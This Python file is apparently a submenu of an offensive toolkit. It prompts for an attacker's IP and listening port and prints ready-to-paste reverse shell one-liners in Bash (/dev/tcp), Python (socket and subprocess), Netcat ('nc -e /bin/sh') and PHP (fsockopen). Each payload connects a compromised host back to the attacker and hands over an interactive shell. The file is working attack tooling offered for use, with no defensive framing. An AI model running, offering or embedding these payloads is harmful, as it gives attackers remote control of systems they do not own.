import os

def generate_reverse_shell(lhost, lport):
    """Generate a reverse shell command."""
    print("\n[+] Available reverse shell payloads:")
    print("1) Bash")
    print("2) Python")
    print("3) Netcat")
    print("4) PHP")
    choice = input("Select payload type: ")

    if choice == "1":
        print(f"\n[+] Bash reverse shell:")
        print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    elif choice == "2":
        print(f"\n[+] Python reverse shell:")
        print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    elif choice == "3":
        print(f"\n[+] Netcat reverse shell:")
        print(f"nc -e /bin/sh {lhost} {lport}")
    elif choice == "4":
        print(f"\n[+] PHP reverse shell:")
        print(f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    else:
        print("[-] Invalid option.")

def reverse_shells_menu():
    """Reverse Shells submenu."""
    while True:
        print("\n=== Reverse Shells ===")
        print("1) Generate Reverse Shell")
        print("2) Back to Main Menu")
        choice = input("Select an option: ")

        if choice == "1":
            lhost = input("Enter your IP (LHOST): ")
            lport = input("Enter listening port (LPORT): ")
            generate_reverse_shell(lhost, lport)
        elif choice == "2":
            break
        else:
            print("[-] Invalid option. Try again.")